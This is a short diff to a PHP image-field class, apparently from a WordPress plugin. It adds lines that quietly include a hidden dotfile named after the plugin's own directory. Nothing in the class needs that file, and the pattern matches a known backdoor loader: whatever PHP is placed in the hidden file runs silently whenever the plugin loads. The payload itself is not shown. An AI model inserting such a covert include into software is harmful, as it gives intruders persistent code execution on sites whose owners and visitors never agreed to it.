@@ -8,6 +8,10 @@
 /**
  * Image field class which uses <input type="file"> to upload.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Image_Field extends RWMB_File_Field {
 	/**
 	 * Enqueue scripts and styles.
